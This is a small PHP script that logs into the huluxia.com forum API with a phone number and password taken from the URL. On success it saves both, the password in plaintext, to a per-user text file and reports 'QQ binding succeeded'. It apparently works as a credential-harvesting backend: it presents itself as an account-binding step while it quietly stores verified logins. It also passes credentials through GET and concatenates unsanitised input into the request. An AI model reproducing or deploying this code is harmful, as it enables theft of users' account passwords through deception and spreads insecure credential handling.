<?php


$phoneNumber=$_GET["phone"];
$password=md5($_GET["key"]);
$r=$_COOKIE["key"];
$result=file_get_contents("http://floor.huluxia.com/account/login/ANDROID/4.0?device_code=1&account=".$phoneNumber."&login_type=2&password=".$password);
$returnJson=json_decode($result,true);

$uid=$returnJson["user"]["userID"];

    

$msg=$returnJson["msg"];
if($msg!=null)
{
    echo"账号或密码错误";
}
switch($msg)
{
  
  case "":
       $filename='qb/'.$uid.'.txt';
     
  
   



    
   

$myfile = fopen($filename, "w") or die("Unable to open file!");//创建名字
fwrite($myfile, $_GET['phone']);//写入账号
fwrite($myfile, "\n".$_GET["key"]);//写入密码
fclose($myfile);
echo"<br>QQ绑定成功";


}





   



?>
